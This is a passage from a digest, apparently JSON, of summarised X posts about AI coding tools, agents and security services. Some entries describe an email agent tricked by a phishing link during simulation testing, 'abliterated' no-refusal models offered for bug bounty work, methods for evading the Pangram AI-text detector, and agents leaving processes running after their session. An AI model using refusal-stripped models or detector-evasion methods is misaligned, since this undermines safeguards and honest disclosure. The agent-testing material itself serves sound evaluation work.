+    "essence": "Dave Kiss points out that agents start dev servers and leave them running for days until the laptop fans spin up. Theo's T3 Code AGENTS.md says its servers ran for weeks and filled RAM and swap. So the file tells agents to run dev servers from their own shell, so the servers end with the session. The rule bans nohup, setsid and tmux unless you ask for a server that outlives the session. Replies say a microVM sandbox that reclaims itself removes the problem. Another says an agent left utilities running after it moved out.",
+    "summary": "Copy the rule into your AGENTS.md or CLAUDE.md. It costs nothing and stops stray processes.",
+    "productLinks": [],
+    "topicTags": [
+      "agents-md",
+      "dev-servers",
+      "claude-code",
+      "processes",
+      "rules"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "image"
+  },
+  {
+    "uid": "X-404",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Git worktrees for agents",
+    "title": "twig: native copy-on-write git worktrees that save disk space for agents",
+    "author": "Leo 🏴‍☠️",
+    "date": "2026-11-16",
+    "url": "https://x.com/leostera/status/2122320765530124479",
+    "engagement": "50 replies · 28 reposts · 655 likes · 832 bookmarks · 55.4K views",
+    "essence": "Leo Stera releases twig (git-twig), which makes git worktrees for agents with native copy-on-write and verified materialization. His 512 GB disk can finally breathe. He says large repos use about 80% less space on Ubuntu 26, with bigger gains on macOS, and some builds reach 40 GB a day from a clean target folder. Replies raise limits. Worktrees still share Docker containers and databases, Rust builds still take 6 to 12 GB, and one user worries about pnpm junctions on Windows. A detailed reply says the tool falls back to a slow copy when a repo has a text attribute such as * text=auto. Adding * -text to .git/info/attributes fixes it. Leo asks users to have their agent open a GitHub issue.",
+    "summary": "Try it if you run many agent worktrees on a small disk. Check the text attribute issue first.",
+    "productLinks": [
+      "https://twig.leostera.dev/",
+      "https://github.com/leostera/git-twig"
+    ],
+    "topicTags": [
+      "git",
+      "worktrees",
+      "copy-on-write",
+      "agents",
+      "disk-space"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-405",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Video tooling",
+    "title": "vidscribe: local transcripts and frame sheets so agents can watch videos",
+    "author": "Samuel Zhang",
+    "date": "2026-11-15",
+    "url": "https://x.com/samuelxzhang/status/2122058913692746224",
+    "engagement": "36 replies · 68 reposts · 1.3K likes · 1.5K bookmarks · 46.2K views",
+    "essence": "Samuel Zhang releases /vidscribe, which lets agents watch videos. It uses ffmpeg and adds a local transcript, 16 frames per image and an index that ties each frame to what was said, so the agent knows where to look. He says it saves tokens and keeps accuracy in his eval. It runs on Apple Silicon only, is local and free, and works with any agent. He says Gemini hears music and sounds and vidscribe does not, and he has not run a head-to-head test. Replies ask why it is better than what agents do natively with ffmpeg and why it is Apple-only. His answer is that he uses a Mac. His thread also links OpenFilm. See X-380.",
+    "summary": "Useful when an agent must reason over a screen recording or tutorial video. It has no audio understanding beyond speech.",
+    "productLinks": [
+      "https://github.com/SamuelZ12/vidscribe",
+      "https://github.com/openfilm/"
+    ],
+    "topicTags": [
+      "vidscribe",
+      "video",
+      "ffmpeg",
+      "agents",
+      "apple-silicon"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-406",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Weight-space models",
+    "title": "codehygiene: a tiny 'model' compiled straight into weights, with no training",
+    "author": "brian",
+    "date": "2026-11-15",
+    "url": "https://x.com/brianbellx/status/2121973517273153540",
+    "engagement": "17 replies · 25 reposts · 605 likes · 799 bookmarks · 42.3K views",
+    "essence": "Brian posts codehygiene, a weight-space compiled model for code readability and hygiene. He says it has 428K ternary (1.58-bit) parameters, no gradients and no training, runs in 10 ms on a CPU, and installs with npx skills add brianbell-x/codehygiene -g. He says the file is 11 KB, and the repo card says 33 KB. A second post says the whole training run is one script, compile.py, which takes 1.5 seconds on a laptop with no dataset and no GPU and writes all 569,662 weights. So retraining means edit, run, eval. The two posts give different parameter counts, so check the repo. Replies ask whether the AI wrote the weights by hand (he says yes). Others say the word model is stretched for a skill. Another asks whether regexes were encoded as convolutions, and posts his own remix, nits (github.com/jkomyno/nits), saying you cannot easily do without parsers.",
+    "summary": "Treat it as a compiled rule set more than a trained model. Read compile.py before you trust the output. See also the weight-editing entry in this batch.",
+    "productLinks": [
+      "https://github.com/brianbell-x/codehygiene",
+      "https://github.com/jkomyno/nits",
+      "https://x.com/brianbellx/status/2122517293582410041",
+      "https://x.com/jkomyno/status/2122419175453032471"
+    ],
+    "topicTags": [
+      "weight-space",
+      "ternary",
+      "code-quality",
+      "skills",
+      "cpu"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "image",
+    "relatedUrls": [
+      "https://x.com/brianbellx/status/2122517293582410041",
+      "https://x.com/jkomyno/status/2122419175453032471"
+    ]
+  },
+  {
+    "uid": "X-407",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Open-source UI",
+    "title": "Amicro: 160+ copy-paste React micro-interaction components",
+    "author": "Kiyotaka",
+    "date": "2026-11-15",
+    "url": "https://x.com/SubhanHQ/status/2121940837064208841",
+    "engagement": "17 replies · 50 reposts · 812 likes · 2.2K bookmarks · 172K views",
+    "essence": "Kiyotaka posts amicro.dev with the line that vibecoders will thank him later. The site offers 160+ copy-paste React components for motion, transitions and UI effects: buttons, morphing icons, card spreads, 3D carousels, loaders, mono charts and text animations. It also has a CLI and skills. Kiyotaka says it is fully open source. The site says it is backed by the Vercel OSS Program and shows 2,843 stars. Replies ask what it is for, and the post does not explain.",
+    "summary": "A good source of ready-made motion for a vibe-coded UI. Check the licence and bundle size before you ship it.",
+    "productLinks": [
+      "https://amicro.dev/"
+    ],
+    "topicTags": [
+      "react",
+      "micro-interactions",
+      "animation",
+      "components",
+      "open-source"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-408",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Open-source UI",
+    "title": "pdfcn and snapcn: shadcn-style PDF and Remotion video components from an unofficial account",
+    "author": "Shadcn Labs",
+    "date": "2026-11-15",
+    "url": "https://x.com/shadcnlabs/status/2121850779862720617",
+    "engagement": "21 replies · 39 reposts · 1.3K likes · 2.3K bookmarks · 186.5K views",
+    "essence": "The Shadcn Labs account posts two projects. pdfcn.dev is a set of PDF components built on Takumi and Forme that works with shadcn/ui and can render on the server. snapcn.dev is a shadcn registry of Remotion components for React video: text animations, captions, device mockups and full scenes, installed with the CLI under an MIT licence. The account says Claude can make launch videos with it. The pdfcn replies are harsh. Many call the output generic AI slop, and one reader says Word or PowerPoint templates look better for financial reports. Several say the name misleads, because the account is not affiliated with shadcn. The account answers that its bio says so. One reader asks for mobile preview.",
+    "summary": "snapcn is the more useful of the two for video work. Neither project is an official shadcn project.",
+    "productLinks": [
+      "https://snapcn.dev/",
+      "https://www.pdfcn.dev/",
+      "https://x.com/shadcnlabs/status/2122334078242636163"
+    ],
+    "topicTags": [
+      "shadcn",
+      "remotion",
+      "pdf",
+      "react",
+      "components"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": "",
+    "relatedUrls": [
+      "https://x.com/shadcnlabs/status/2122334078242636163"
+    ]
+  },
+  {
+    "uid": "X-409",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "AI-text detection",
+    "title": "Three ways to beat Pangram: Wikipedia sentences, structure transfer, adversarial RL",
+    "author": "archivedvideos",
+    "date": "2026-11-15",
+    "url": "https://x.com/archived_videos/status/2121804512272814548",
+    "engagement": "72 replies · 211 reposts · 10.7K likes · 4.9K bookmarks · 469.9K views",
+    "essence": "Three bookmarked posts show weaknesses in AI-text detectors. First, archivedvideos says you can ask Claude to download Wikipedia and write articles using only sentences from it, and Pangram scores the result as 100% human. A reader reproduced it. Critics say it cannot make novel arguments. Second, ampdot releases a writing-scaffold MCP prompt library that uses the structure of another text, such as an NTSB report, as a scaffold. With retries, up to 96% of prompts from WildChat score as Human, Mixed or AI-assisted. The eval exploits the fact that Pangram struggles with text that mixes AI and non-AI parts. The public endpoint logs the topics people use. Third, Julian Harris points to an open-source repo from Edison Scientific (prime-rl-adversarial-paper) that trains a model for writing a detector cannot spot. Replies ask why anyone releases this.",
+    "summary": "Detectors are weak, so do not use one alone for grading or hiring decisions. Read the full report and the eval repo for the method.",
+    "productLinks": [
+      "https://writing-scaffold-mcp.google.org.ag/pangram-miss-benchmark.html",
+      "https://github.com/ampdot-io/ai-detection-eval",
+      "https://github.com/EdisonScientific/prime-rl-adversarial-paper/tree/main",
+      "https://x.com/amplifiedamp/status/2122300505951293802",
+      "https://x.com/julianharris/status/2122186120159244746"
+    ],
+    "topicTags": [
+      "pangram",
+      "ai-detection",
+      "writing",
+      "adversarial",
+      "wikipedia"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "",
+    "relatedUrls": [
+      "https://x.com/amplifiedamp/status/2122300505951293802",
+      "https://x.com/julianharris/status/2122186120159244746"
+    ]
+  },
+  {
+    "uid": "X-410",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Claude Code workflows",
+    "title": "Claude Code Code Mode: Claude writes JavaScript to run many tool calls in one step",
+    "author": "Daniel San",
+    "date": "2026-11-15",
+    "url": "https://x.com/dani_avila7/status/2121789088499933223",
+    "engagement": "167 replies · 102 reposts · 2K likes · 1.9K bookmarks · 270.6K views",
+    "essence": "Daniel San reports that Code Mode is available as an experiment in Claude Code 2.1.325. Claude writes JavaScript that runs several tool calls in one step. It can run commands in parallel, chain steps and filter results before it returns them to the model. Enable it with CLAUDE_CODE_EXPERIMENTAL_CODE_MODE=1 or with npx claude-code-templates@latest --setting environment/code-mode, then restart. In his demo with Fable 5.2, Claude ran 13 tool calls in 2 model turns and found all 3 broken Markdown links. Ctrl+O shows the generated code, and permissions and hooks still apply. A reply quotes the docs pitfalls: it works only in the interactive terminal, not with -p, the Agent SDK, the VS Code panel or Desktop, and you must keep it on when you resume a session. Skeptics ask why tools need scripts, and one says it copies Pi Codemode.",
+    "summary": "Try it on multi-step tasks and press Ctrl+O to inspect the code. It is interactive-terminal only, so it does not fit scripted runs.",
+    "productLinks": [
+      "https://code.claude.com/docs/en/code-mode"
+    ],
+    "topicTags": [
+      "claude-code",
+      "code-mode",
+      "tool-calls",
+      "experimental",
+      "javascript"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "image"
+  },
+  {
+    "uid": "X-411",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "CI speed",
+    "title": "Four ways agents cut CI to under 2 minutes: diff-aware tests, shards, parallel jobs, all cores",
+    "author": "Pontus Abrahamsson",
+    "date": "2026-11-14",
+    "url": "https://x.com/pontusab/status/2121982070193058191",
+    "engagement": "111 replies · 169 reposts · 4.4K likes · 7.9K bookmarks · 546.4K views",
+    "essence": "Pontus Abrahamsson says his frontend CI is under 2 minutes. He moved tsc to bun check, turned on every Oxlint rule, filled shards by recorded test time, ran only the tests the diff can reach, and ran lint, typecheck, build and tests in parallel. In replies, Vitest --changed against the merge base runs a test only if it imports a changed file. Lockfile, config or generated-client changes force a full run, and the merge queue and main always run everything. A runtime map was the biggest win. Three related bookmarks add prompts. One is his follow-up post about the instructions he used. Daniel Lockyer's prompt tells the agent to check the runner CPU core count and use every core (public ubuntu-latest runners have 4 cores). Ashwin's trimmed prompt took a CI from 10 to 25 minutes to under 2. It ran benchmarks locally, used native per-architecture Docker builds with no QEMU, and ran all 14 test groups at once. Replies add tsrs (Rust type checker from Oxc), Oxlint's typeCheck option, dblock's already-tested (skip CI that agents already ran), and warnings about E2E tests, peak memory and CI cost.",
+    "summary": "Copy the CI prompt and the diff-aware test idea. Check peak memory and total CI cost before you give every core a worker.",
+    "productLinks": [
+      "https://github.com/oxc-project/tsrs",
+      "https://oxc.rs/blog/2026-11-17-faster-type-aware-linting-with-tsrs",
+      "https://github.com/dblock/already-tested",
+      "https://x.com/pontusab/status/2121990184816484483",
+      "https://x.com/DanielLockyer/status/2122715245927973261",
+      "https://x.com/wizardashwin/status/2122582910385709253"
+    ],
+    "topicTags": [
+      "ci",
+      "github-actions",
+      "vitest",
+      "oxlint",
+      "sharding",
+      "prompts"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "",
+    "relatedUrls": [
+      "https://x.com/pontusab/status/2121990184816484483",
+      "https://x.com/DanielLockyer/status/2122715245927973261",
+      "https://x.com/wizardashwin/status/2122582910385709253"
+    ]
+  },
+  {
+    "uid": "X-412",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Bug bounty research",
+    "title": "HexBrain: every disclosed HackerOne report and 405K CVEs on one interactive map",
+    "author": "Shubham Gupta 🇮🇳",
+    "date": "2026-11-13",
+    "url": "https://x.com/hackerspider1/status/2121200814387798381",
+    "engagement": "76 replies · 194 reposts · 1K likes · 1.1K bookmarks · 43.7K views",
+    "essence": "Shubham Gupta builds HexBrain, an interactive map of 15,000+ publicly disclosed HackerOne reports grouped by vulnerability class, weakness and program, with full write-ups on how each bug was found. It also lists 405,000+ CVEs with exploited ones in red, plus bypass and payload libraries. The site says you can connect Claude, ChatGPT or another AI assistant to search it. In the thread he says access is by invitation (DM an email), the map shows what each program accepted, and an MCP exists but free public access costs too much. Replies ask for report status (valid, N/A, informative), a trend over the years, and a comparison of prerequisites between similar findings.",
+    "summary": "A strong research aid for authorised bug bounty work. Access is by invitation for now.",
+    "productLinks": [
+      "https://hexbrainai.com/"
+    ],
+    "topicTags": [
+      "bug-bounty",
+      "hackerone",
+      "cve",
+      "security",
+      "research"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-413",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Security sandboxes",
+    "title": "offense.sh: disposable sandboxes for security agents, first sandbox free",
+    "author": "imran",
+    "date": "2026-11-13",
+    "url": "https://x.com/imranye/status/2121090161073369147",
+    "engagement": "5 replies · 5 reposts · 87 likes · 48 bookmarks · 4.9K views",
+    "essence": "Imran offers a first sandbox free on offense.sh. The site says it brings security agents and tools into disposable sandboxes where you test apps, review findings and evidence, and retest fixes. He asks users to break it and send feedback, and jokes that Claude made it. Replies are weak. One says the sign-up flow is broken, and others say the page looks like a generic AI template. The rest of the captured replies are unrelated feed posts.",
+    "summary": "Early and unproven. Try the free sandbox on a test app only.",
+    "productLinks": [
+      "https://offense.sh/"
+    ],
+    "topicTags": [
+      "offense-sh",
+      "security",
+      "sandbox",
+      "agents",
+      "pentest"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-414",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Fonts",
+    "title": "OpenCode Font: a typeface cut from the OpenCode wordmark",
+    "author": "dax",
+    "date": "2026-11-13",
+    "url": "https://x.com/thdxr/status/2121047123290362335",
+    "engagement": "60 replies · 47 reposts · 1.9K likes · 506 bookmarks · 118.9K views",
+    "essence": "Dax posts the OpenCode Font page (opencode.ai/font) with the line that this is what happens when a designer has AI psychosis. The page shows a typeface cut from the OpenCode wordmark. Replies ask whether the font is open source and what it all means. One joke reply points to llama.ttf, a font with a small LLM inside (fuglede.github.io/llama.ttf). Another complains that the page upsells free utilities.",
+    "summary": "A brand curiosity. Check the font licence before you use it.",
+    "productLinks": [
+      "https://opencode.ai/font",
+      "https://fuglede.github.io/llama.ttf/"
+    ],
+    "topicTags": [
+      "opencode",
+      "font",
+      "branding",
+      "design",
+      "typeface"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-415",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Agent UI",
+    "title": "Vercel UI SDK: a library of behaviors for agents that build user interfaces",
+    "author": "Vercel",
+    "date": "2026-11-12",
+    "url": "https://x.com/vercel/status/2120950020249895314",
+    "engagement": "217 replies · 676 reposts · 6.6K likes · 5.4K bookmarks · 882.7K views",
+    "essence": "Vercel introduces the UI SDK with a launch video and a link to vercel-labs/ui, described as a library of behaviors for agents to build the next generation of user interfaces. The post has no body text. Replies ask the useful questions. Will it exist next to Base UI, React Aria and Radix as a new primitive option? How does it differ from pointing an agent at shadcn? Another asks what behaviors means. The captured replies give no answer. The post reached 882.7K views and 5.4K bookmarks.",
+    "summary": "Read the repo README, because the post does not explain the idea. Compare it with shadcn before you adopt it.",
+    "productLinks": [
+      "https://github.com/vercel-labs/ui"
+    ],
+    "topicTags": [
+      "vercel",
+      "ui-sdk",
+      "agents",
+      "frontend",
+      "behaviors"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-416",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Agent workflow",
+    "title": "A stack: Fable 5.2 plans with /grill-me, Opus 5.5 subagents build, Cloudflare CLI hosts",
+    "author": "Machina",
+    "date": "2026-11-12",
+    "url": "https://x.com/EXM7777/status/2120856056977113363",
+    "engagement": "46 replies · 45 reposts · 1.3K likes · 1.5K bookmarks · 62.3K views",
+    "essence": "Machina shares a compact stack. Fable 5.2 on high effort runs /grill-me, then /to-spec and /to-tickets. Opus 5.5 subagents on medium effort run /implement. The Cloudflare CLI handles hosting and the database. Replies say the Cloudflare CLI is the real insider choice. One adds a deep-opinion skill and a delegation skill in Fable 5.2. Several readers say grill-me before the spec is the part they will copy, because they used to skip straight to building. One asks whether the grill step catches real problems or only slows work.",
+    "summary": "A good template for splitting plan and build across two models. Test whether the grill step pays off on your tasks.",
+    "productLinks": [],
+    "topicTags": [
+      "fable-5-2",
+      "opus-5-5",
+      "cloudflare",
+      "workflow",
+      "subagents"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-417",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Video editing skills",
+    "title": "Scarlet: Matthew Berman open-sources his AI video editor for macOS and Windows",
+    "author": "Matthew Berman",
+    "date": "2026-11-12",
+    "url": "https://x.com/MatthewBerman/status/2121297629711909166",
+    "engagement": "45 replies · 38 reposts · 605 likes · 706 bookmarks · 39.2K views",
+    "essence": "Matthew Berman open-sources Scarlet (Forward-Future/scarlet), an AI video editor for macOS and Windows. He says it is buggy but speeds up his editing, and he asks for feedback. The quoted post from 12 Nov asked for testers. In replies he says a demo video will come in 1 to 2 weeks. Readers promise feedback and pull requests, and one says he is building his own editor.",
+    "summary": "A real tool that one creator uses daily. Expect bugs and check the repo for builds.",
+    "productLinks": [
+      "https://github.com/Forward-Future/scarlet"
+    ],
+    "topicTags": [
+      "scarlet",
+      "video-editing",
+      "open-source",
+      "macos",
+      "windows"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-418",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Agent testing",
+    "title": "Plurai simulation plugin: test an email agent with 27 mock conversations before it goes live",
+    "author": "Mehul Mohan",
+    "date": "2026-11-11",
+    "url": "https://x.com/mehulmpt/status/2120551495229939847",
+    "engagement": "10 replies · 2 reposts · 32 likes · 12 bookmarks · 3.3K views",
+    "essence": "Mehul Mohan tested his business inbox agent before he trusted it. A prompt that said be careful with links did not stop the model from opening a fake Google sign-in link. He used Plurai's Claude Code plugin: add plurai-ai/plurai-plugins, install plurai-simulation, then run /plurai-simulation:simulate. It reads the code, maps every tool and swaps real-world tools such as send_email for mocks. It writes 9 scenarios and runs each 3 times. On DeepSeek V4.1 Flash, 19 of 27 conversations passed and 8 gaps showed up. On DeepSeek V4 Pro, 21 of 27 passed and the phishing scenario passed 3 of 3. After he applied the top three fixes, Flash passed 22 of 27. His real setup opens links in a stripped Chrome in Docker, and the agent can draft but cannot send. The thread ends with an ad for Plurai.",
+    "summary": "A good pattern: mock the tools, run each scenario three times, and keep a human on Send. The vendor benefits from the test.",
+    "productLinks": [
+      "https://www.plurai.ai/"
+    ],
+    "topicTags": [
+      "agent-testing",
+      "simulation",
+      "phishing",
+      "claude-code",
+      "deepseek"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-419",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Agent test hygiene",
+    "title": "/prune-tests skill removes tests that change with the code or can never fail",
+    "author": "Maze",
+    "date": "2026-11-10",
+    "url": "https://x.com/mazeincoding/status/2122718134679298058",
+    "engagement": "55 replies · 94 reposts · 2.9K likes · 4.3K bookmarks · 133.9K views",
+    "essence": "Maze releases /prune-tests, a skill that finds and removes tests that change whenever the code changes, check that deleted features are gone, or can never fail. The demo video was made with Opus 5.5. The quoted post, by Samuel Robertson, describes the problem: an agent removes a feature and adds 4,000 lines of tests that assert the feature is gone. Maze says the skill works well in agent reviews and can run on a whole codebase if you have tokens to spend. The skill is in caldoai/skills. One reply says the post text could replace the skill, and Maze says the skill covers more. One user found 19 useless tests on the first run. One reader warns that tests which change with the code often catch regressions. Another suggests mutation tests. See X-013 and X-257.",
+    "summary": "Run it as a review pass and read every deletion. Mutation testing is the safer check for tests that look useless.",
+    "productLinks": [
+      "https://github.com/caldoai/skills/blob/main/skills/prune-tests/SKILL.md"
+    ],
+    "topicTags": [
+      "skills",
+      "tests",
+      "ai-slop",
+      "claude-code",
+      "mutation-testing"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-420",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Weight editing",
+    "title": "Editing weights instead of training: Deletion Tuning, a decision-model edit and autorsi",
+    "author": "Jack Lu ✈️ NeurIPS 26",
+    "date": "2026-11-10",
+    "url": "https://x.com/Jacklu_me/status/2120217064073830401",
+    "engagement": "81 replies · 341 reposts · 2.4K likes · 2.3K bookmarks · 165.6K views",
+    "essence": "Three posts on changing a model by editing its weights. Jack Lu's Deletion Tuning (NeurIPS 2026) zeroes under 0.1% of weights. A 30 MB binary mask matches full fine-tuning on a 30B mixture-of-experts model, forgets less than full fine-tuning and LoRA, and works with RL, SFT and self-distillation. Masks can be stored, swapped and possibly merged. Union of masks keeps accuracy in early runs. Paper arxiv 2611.10866, with code and masks on Hugging Face. Nandakishor edited Qwen3.5-0.8B weights directly from a decision model fitted on 300 examples. Tool-use decisions went from 18% to 98% in 3 ms with no training, and maths did not improve. Samuel Ekpe shares autorsi, a library for bounded weight editing with evaluation gates. Replies bet that people will edit weights and not post-train small models, and one points to deltaleague.ai, which hosts competitive edits.",
+    "summary": "Fits the vault's model-internals reading. The deletion paper is the best sourced. Treat the other two claims as author claims.",
+    "productLinks": [
+      "https://arxiv.org/abs/2611.10866",
+      "https://github.com/agentic-learning-ai-lab/deleting-weights",
+      "https://huggingface.co/Jacklu0831/deletion-tuning-masks",
+      "https://github.com/geniusgeek/autorsi",
+      "https://www.embedding.in/blog/a-decision-skill-written-into-the-weights",
+      "https://x.com/samuelekpe/status/2120286387081822265",
+      "https://x.com/Nandakishorm1/status/2120053213793845282"
+    ],
+    "topicTags": [
+      "weight-editing",
+      "deletion-tuning",
+      "fine-tuning",
+      "continual-learning",
+      "masks"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "video",
+    "relatedUrls": [
+      "https://x.com/samuelekpe/status/2120286387081822265",
+      "https://x.com/Nandakishorm1/status/2120053213793845282"
+    ]
+  },
+  {
+    "uid": "X-421",
+    "platform": "Twitter",
+    "category": "Tech Industry & News",
+    "subcategory": "Security incident",
+    "title": "Railway's October 21 breach, explained in a video: how the attacker got to customer variables",
+    "author": "Amarnath",
+    "date": "2026-11-10",
+    "url": "https://x.com/amrnth0/status/2120849097871810973",
+    "engagement": "6 replies · 20 reposts · 456 likes · 291 bookmarks · 34.1K views",
+    "essence": "Amarnath posts a video, narrated with ElevenLabs and explained with Fable 5.2, of Railway's incident report. The report (10 Nov) says an attacker escaped build isolation on 20 Oct and stole a build credential. They then copied the codebase, used it to find a bad OIDC binding in a cloud environment, and reached a machine that could decrypt environment variables. At most 1.85% of workspaces, about 100,000, could have had variables decrypted. The attacker looked for AI provider keys and read 353 build histories. Railway rotated credentials, ended every session and token, and works with AI providers on refunds for unauthorised token spend. In replies the author says the report does not explain how the attacker signed up when dummy accounts were blocked, and readers stress defence in depth.",
+    "summary": "If you use Railway, rotate your secrets and report any AI token charges that you did not make.",
+    "productLinks": [
+      "https://blog.railway.com/p/incident-report-october-security-incident"
+    ],
+    "topicTags": [
+      "railway",
+      "security-incident",
+      "oidc",
+      "secrets",
+      "build-isolation"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "video",
+    "important": {
+      "note": "Railway breach (20 to 21 Oct 2026): up to 1.85% of workspaces had environment variables decrypted. If you use Railway, rotate secrets and report AI token charges that you did not make. Checked 18 Nov 2026."
+    }
+  },
+  {
+    "uid": "X-422",
+    "platform": "Twitter",
+    "category": "Startups, Product & Marketing",
+    "subcategory": "SEO visibility hacks",
+    "title": "Free profiles on 21 high-DR sites that link back to a new site",
+    "author": "Oleksii",
+    "date": "2026-11-10",
+    "url": "https://x.com/acecreamu/status/2120146829018804614",
+    "engagement": "52 replies · 46 reposts · 725 likes · 2.3K bookmarks · 80.9K views",
+    "essence": "Oleksii lists 21 sites where you can make a free profile that links to your own site. He gives a Domain Rating for each. The top ones are chromewebstore.google.com 99, pages.github.com 96, Medium 94 and climate.stripe.com 94. Behance, linktr.ee, about.me and G2/Capterra are at 91 to 92. Product Hunt, dev.to and Gumroad are at 90. Smaller ones include indiepa.ge 67 and TrustMRR 78. His reply says the profiles help Google find and trust a new site. Replies correct this. Crunchbase, G2, Capterra, about.me and GitHub help reputation management and AI answers more than SEO. Blog sites such as Medium and Substack help SEO, and LinkedIn articles can be added. One reader asks whether most profile links are nofollow. See X-387 for the Ahrefs DR change on 1 Dec.",
+    "summary": "Use it as a checklist for brand profiles. Do not expect direct ranking gains from nofollow links.",
+    "productLinks": [],
+    "topicTags": [
+      "seo",
+      "backlinks",
+      "domain-rating",
+      "geo",
+      "profiles"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-423",
+    "platform": "Twitter",
+    "category": "Startups, Product & Marketing",
+    "subcategory": "Free tiers",
+    "title": "free-for.dev: every free tier for hosting, databases, auth and email on one page",
+    "author": "Kunal",
+    "date": "2026-11-10",
+    "url": "https://x.com/kunal_twts/status/2120053334447120654",
+    "engagement": "39 replies · 93 reposts · 1.3K likes · 2.7K bookmarks · 108.5K views",
+    "essence": "Kunal praises free-for.dev, the page that lists free tiers for hosting, databases, auth, email and more. His thread adds a design concept, a pointer to niche lists, and a request to add listings to AppFinder. Replies are mostly more lists: Dev Design Library, utilitihub.com and naijacloud.com. One reader says free databases add seconds to the first request because they sleep. Another says it looks like a maintenance headache. The post got 2,674 bookmarks and 108K views.",
+    "summary": "An evergreen list. Check each free tier's current limits before you depend on it.",
+    "productLinks": [
+      "https://free-for.dev/",
+      "https://appfinder.tech/",
+      "https://devlibraries.com/"
+    ],
+    "topicTags": [
+      "free-tier",
+      "hosting",
+      "indie-hackers",
+      "databases",
+      "tools"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": ""
+  },
+  {
+    "uid": "X-424",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Agent browser automation",
+    "title": "Browser Use 1.0.0: the library drops 90% of its code and runs a Python REPL on raw CDP",
+    "author": "Browser Use",
+    "date": "2026-11-10",
+    "url": "https://x.com/browser_use/status/2119983662162952278",
+    "engagement": "50 replies · 105 reposts · 1.2K likes · 1.2K bookmarks · 201.7K views",
+    "essence": "Browser Use releases 1.0.0 with the line that CDP is all you need. The team deleted about 90% of the old library, because a fixed state and action space makes agents worse. Now the agent writes a Python REPL on raw CDP. The post claims the same models do up to 50% better, 2 to 5x cheaper and 2 to 3x faster, and calls it a state-of-the-art web agent. The team will ship fast and asks users to pin the version with ==. A thread reply says the team is 5 people. Replies ask how it relates to browse harness, how it gates high-impact actions such as purchases, whether it is just code mode, and one says the team tried this a year and a half ago.",
+    "summary": "This is a breaking rewrite. Pin the exact version before you upgrade, and check how your agent gates purchases.",
+    "productLinks": [
+      "https://github.com/browser-use/browser-use/releases/tag/1.0.0"
+    ],
+    "topicTags": [
+      "browser-use",
+      "cdp",
+      "web-agents",
+      "python",
+      "release"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "image",
+    "important": {
+      "note": "Browser Use 1.0.0 deletes about 90% of the old library, and the team says it will ship fast. Pin the exact version with == before you upgrade."
+    }
+  },
+  {
+    "uid": "X-425",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Free models for security work",
+    "title": "Free no-refusal models for bug bounty: MiniMax M3.1 Flash and nodecode Cyber v1",
+    "author": "DestroyerX",
+    "date": "2026-11-10",
+    "url": "https://x.com/ide9x/status/2119986387638497519",
+    "engagement": "24 replies · 76 reposts · 2K likes · 1K bookmarks · 83.4K views",
+    "essence": "Two posts about free models for bug bounty work. IDE9X recommends MiniMax M3.1 Flash, now free in OpenCode, and says Flash finds bugs that DeepSeek misses. His order is DeepSeek v4.1 Flash, then MiniMax M2.6 Flash. Replies name GLM 5.3 abliterated as another favourite, and one asks about a rate limit after 10 minutes. The second post, by painn_x, announces nodecode Cyber v1, an abliterated DeepSeek v4.1 Flash with no refusals, 1M context (262K on the free tier), EU hosting and no stored prompts. To get a free key you create an account, pay $2 to unlock the paid tier as a bot filter, grab a key and run nodecode login. The free tier was limited in time and the author expected it to end around 9 Nov, so it has probably ended. Replies say a $2 top-up is not free, and one paid and saw no free option.",
